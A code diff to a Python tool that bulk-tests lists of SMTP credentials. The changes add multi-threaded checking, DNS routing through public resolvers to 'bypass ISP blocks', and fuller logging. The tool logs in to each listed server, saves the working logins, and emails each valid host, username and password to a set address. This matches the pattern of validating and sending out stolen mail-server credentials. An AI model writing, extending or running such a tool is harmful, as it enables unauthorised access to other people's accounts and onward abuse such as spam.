@@ -7,21 +7,51 @@ import smtplib
 import logging
 import argparse
 import base64
+import signal
+import socket
 import concurrent.futures
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from colorama import Fore, Style, init
 from tqdm import tqdm
+import dns.resolver
+import dns.exception
 
 # Initialize Colorama
 init(autoreset=True)
 
-# Setup Logging
-logging.basicConfig(
-    filename="Result/logs.txt",
-    level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s"
-)
+# Enhanced Logging Setup
+def setup_logging():
+    """Setup comprehensive logging with both file and console handlers."""
+    # Create logger
+    logger = logging.getLogger('smtp_checker')
+    logger.setLevel(logging.DEBUG)
+
+    # Remove existing handlers to avoid duplicates
+    logger.handlers = []
+
+    # Create formatters
+    file_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+    console_formatter = logging.Formatter('%(message)s')
+
+    # File handler (DEBUG and above)
+    file_handler = logging.FileHandler("Result/logs.txt", mode='a', encoding='utf-8')
+    file_handler.setLevel(logging.DEBUG)
+    file_handler.setFormatter(file_formatter)
+
+    # Console handler (INFO and above, with colors)
+    console_handler = logging.StreamHandler()
+    console_handler.setLevel(logging.INFO)
+    console_handler.setFormatter(console_formatter)
+
+    # Add handlers to logger
+    logger.addHandler(file_handler)
+    logger.addHandler(console_handler)
+
+    return logger
+
+# Setup enhanced logging
+logger = setup_logging()
 
 # Colors
 R = Fore.RED + Style.BRIGHT
@@ -74,7 +104,7 @@ def logo():
     banner = f"""
     ███████╗██╗     ███████╗██╗  ██╗██╗  ██╗    ██████╗ ██╗ ██████╗██╗  ██╗██╗███████╗
     ██╔════╝██║     ██╔════╝╚██╗██╔╝╚██╗██╔╝    ██╔══██╗██║██╔════╝██║ ██╔╝██║██╔════╝
-    █████╗  ██║     █████╗   ╚███╔╝  ╚███╔╝     ██████╔╝██║██║     █████╔╝ ██║█████╗
+    █████╗  ██║     █████╗   ╚███╔╝  ╚███╔╝     ██████╔╝██║██║     ██  █  ██╔╝ ██║█████╗
     ██╔══╝  ██║     ██╔══╝   ██╔██╗  ██╔██╗     ██╔══██╗██║██║     ██╔═██╗ ██║██╔══╝
     ██║     ███████╗███████╗██╔╝ ██╗██╔╝ ██╗    ██║  ██║██║╚██████╗██║  ██╗██║███████╗
     ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝
@@ -93,7 +123,78 @@ os.makedirs("Result", exist_ok=True)
 good, bad = [], []
 VALIDS, INVALIDS = 0, 0
 
-def check_smtp(smtp_line: str):
+# Global flag for graceful shutdown
+interrupted = False
+
+# DNS Servers for bypassing ISP blocks
+DNS_SERVERS = [
+    '8.8.8.8',      # Google DNS
+    '8.8.4.4',      # Google DNS (Alternative)
+    '1.1.1.1',      # Cloudflare DNS
+    '9.9.9.9',      # Quad9 DNS
+    '208.67.222.222', # OpenDNS
+    '208.67.220.220', # OpenDNS (Alternative)
+]
+
+def resolve_hostname_with_dns(host, dns_server):
+    """
+    Resolve hostname using a specific DNS server.
+    """
+    try:
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = [dns_server]
+        resolver.timeout = 5
+        resolver.lifetime = 5
+
+        answers = resolver.resolve(host, 'A')
+        if answers:
+            return str(answers[0])
+        return None
+    except Exception as e:
+        print(f"{Y}[!] DNS resolution failed for {dns_server}: {type(e).__name__}{O}")
+        return None
+
+
+def create_smtp_connection_with_dns(host, port, timeout=30, max_retries=2):
+    """
+    Create SMTP connection with DNS routing to bypass ISP blocks.
+    Tries multiple DNS servers to resolve hostname, then connects directly.
+    """
+    for dns_server in DNS_SERVERS:
+        # First, try to resolve the hostname using this DNS server
+        resolved_ip = resolve_hostname_with_dns(host, dns_server)
+        if not resolved_ip:
+            print(f"{Y}[!] Could not resolve {host} using DNS {dns_server}{O}")
+            continue
+
+        print(f"{C}[*] Resolved {host} -> {resolved_ip} using DNS {dns_server}{O}")
+
+        # Now try to connect to the resolved IP
+        for attempt in range(max_retries):
+            try:
+                # Connect directly to the resolved IP address
+                if port == 465:
+                    server = smtplib.SMTP_SSL(resolved_ip, port, timeout=timeout)
+                else:
+                    server = smtplib.SMTP(resolved_ip, port, timeout=timeout)
+                    server.ehlo()
+                    if port != 25:  # Don't try STARTTLS on port 25
+                        server.starttls()
+                return server
+
+            except (socket.timeout, smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected, OSError) as e:
+                print(f"{Y}[!] Connection attempt {attempt + 1} to {resolved_ip} failed: {type(e).__name__}{O}")
+                if attempt == max_retries - 1:
+                    print(f"{R}[-] All attempts failed for {resolved_ip}:{port}{O}")
+                time.sleep(1)
+            except Exception as e:
+                print(f"{R}[-] Unexpected error with {resolved_ip}: {e}{O}")
+                break
+
+    return None
+
+
+def check_smtp(smtp_line: str, args):
     """
     Test SMTP credentials from line: HOST|PORT|USER|PASS
     """
@@ -103,13 +204,16 @@ def check_smtp(smtp_line: str):
         host, port, usr, pwd = smtp_line.strip().split('|')
         port = int(port)
 
-        server = None
-        if port == 465:
-            server = smtplib.SMTP_SSL(host, port, timeout=10)
-        else:
-            server = smtplib.SMTP(host, port, timeout=10)
-            server.ehlo()
-            server.starttls()
+        print(f"{C}[*] Trying {host}:{port} with DNS routing...{O}")
+        server = create_smtp_connection_with_dns(host, port, timeout=30, max_retries=3)
+
+        if server is None:
+            print(f"{R}[-] Failed to connect to {host}:{port} with all DNS servers{O}")
+            logging.error(f"CONNECTION FAILED: {smtp_line} | All DNS servers failed")
+            bad.append(smtp_line)
+            with open("Result/invalid.txt", "a") as f:
+                f.write(smtp_line + "\n")
+            return False
 
         with server:
             server.login(usr, pwd)
@@ -127,30 +231,61 @@ def check_smtp(smtp_line: str):
                     <p><b>PORT:</b> {port}</p>
                     <p><b>USER:</b> {usr}</p>
                     <p><b>PASS:</b> {pwd}</p>
+                    <p><b>DNS:</b> Routed through public DNS servers</p>
                 </body>
             </html>
             """
             msg.attach(MIMEText(body, "html"))
             server.sendmail(usr, toaddr, msg.as_string())
 
-        logging.info(f"VALID SMTP: {smtp_line}")
+        print(f"{G}[+] VALID SMTP: {host}:{port} | {usr}{O}")
+        logger.info(f"VALID SMTP: {smtp_line}")
         good.append(smtp_line)
         with open("Result/valid.txt", "a") as f:
             f.write(smtp_line + "\n")
         return True
 
     except (smtplib.SMTPAuthenticationError, smtplib.SMTPConnectError, smtplib.SMTPServerDisconnected) as e:
-        logging.error(f"INVALID SMTP: {smtp_line} | ERROR: {type(e).__name__} - {str(e)}")
+        print(f"{R}[-] INVALID SMTP: {host}:{port} | {type(e).__name__}{O}")
+        logger.error(f"INVALID SMTP: {smtp_line} | ERROR: {type(e).__name__} - {str(e)}")
+        bad.append(smtp_line)
+        with open("Result/invalid.txt", "a") as f:
+            f.write(smtp_line + "\n")
+        return False
+    except socket.timeout as e:
+        print(f"{Y}[-] TIMEOUT: {host}:{port} | Connection timed out{O}")
+        logger.error(f"TIMEOUT: {smtp_line} | Connection timed out")
         bad.append(smtp_line)
         with open("Result/invalid.txt", "a") as f:
             f.write(smtp_line + "\n")
         return False
     except Exception as e:
-        logging.error(f"INVALID SMTP: {smtp_line} | ERROR: {str(e)}")
+        print(f"{R}[-] ERROR: {host}:{port} | {type(e).__name__}: {str(e)}{O}")
+        logger.error(f"INVALID SMTP: {smtp_line} | ERROR: {str(e)}")
         bad.append(smtp_line)
         with open("Result/invalid.txt", "a") as f:
             f.write(smtp_line + "\n")
         return False
+
+
+def signal_handler(signum, frame):
+    """Handle interrupt signals gracefully."""
+    global interrupted
+    interrupted = True
+    print(f"\n{Y}[!] Interrupt received. Finishing current tasks and shutting down gracefully...{O}")
+    logger.warning("Interrupt signal received - initiating graceful shutdown")
+    sys.exit(0)
+
+
+def cleanup_and_exit():
+    """Clean up resources and exit gracefully."""
+    global interrupted
+    if interrupted:
+        print(f"\n{Y}[!] Process interrupted. Partial results saved.{O}")
+        logger.warning(f"Process interrupted - VALIDS: {VALIDS}, INVALIDS: {INVALIDS}")
+    else:
+        print(f"\n{G}[+] Process completed successfully.{O}")
+        logger.info(f"Process completed successfully - VALIDS: {VALIDS}, INVALIDS: {INVALIDS}")
 
 
 def main():
@@ -158,8 +293,12 @@ def main():
         print(f"{R}[-] Configuration is invalid. Exiting.{O}")
         return
 
+    # Setup signal handlers for graceful shutdown
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+
     parser = argparse.ArgumentParser(description="Check SMTP credentials.")
-    parser.add_argument("smtp_file", help="Path to the SMTP list file.")
+    parser.add_argument("smtp_file", nargs="?", default="smtp.txt", help="Path to the SMTP list file (default: smtp.txt).")
     parser.add_argument("-t", "--threads", type=int, default=default_threads, help=f"Number of threads (default: {default_threads}).")
     args = parser.parse_args()
 
@@ -167,30 +306,37 @@ def main():
         with open(args.smtp_file, "r") as f:
             smtps = f.read().splitlines()
 
+        print(f"{C}[*] Loaded {len(smtps)} SMTP credentials from {args.smtp_file}{O}")
+        logger.info(f"Starting SMTP check with {args.threads} threads for {len(smtps)} credentials")
+
         with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
-            results = list(tqdm(executor.map(check_smtp, smtps), total=len(smtps), desc=f"{Y}Checking SMTPs{O}", ncols=100))
+            results = list(tqdm(executor.map(lambda smtp: check_smtp(smtp, args), smtps), total=len(smtps), desc=f"{Y}Checking SMTPs{O}", ncols=100))
             VALIDS = sum(1 for r in results if r)
             INVALIDS = len(results) - VALIDS
 
         print(f"\n{G}[+] DONE! VALIDS: {VALIDS}, INVALIDS: {INVALIDS}{O}")
-        logging.info(f"CHECK COMPLETE - VALIDS: {VALIDS}, INVALIDS: {INVALIDS}")
+        logger.info(f"CHECK COMPLETE - VALIDS: {VALIDS}, INVALIDS: {INVALIDS}")
 
     except FileNotFoundError:
         print(f"{R}[-] SMTP file not found: {args.smtp_file}{O}")
-        logging.error(f"SMTP file not found: {args.smtp_file}")
+        logger.error(f"SMTP file not found: {args.smtp_file}")
     except KeyboardInterrupt:
-        print(f"\n{R}[!] Interrupted by user{O}")
-        logging.warning("Process interrupted by user")
+        print(f"\n{Y}[!] Interrupted by user - saving partial results{O}")
+        logger.warning("Process interrupted by user")
     except Exception as e:
         print(f"{R}[-] An unexpected error occurred: {e}{O}")
-        logging.error(f"An unexpected error occurred: {e}", exc_info=True)
+        logger.error(f"An unexpected error occurred: {e}", exc_info=True)
 
 if __name__ == "__main__":
     try:
         main()
     except Exception as e:
         print(f"{R}[-] An unexpected error occurred in main: {e}{O}")
-        logging.error(f"An unexpected error occurred in main: {e}", exc_info=True)
+        logger.error(f"An unexpected error occurred in main: {e}", exc_info=True)
     finally:
+        cleanup_and_exit()
         print(f"\n{C}--- Script finished. Press Enter to exit. ---{O}")
-        input()
+        try:
+            input()
+        except KeyboardInterrupt:
+            print(f"\n{C}Exiting...{O}")
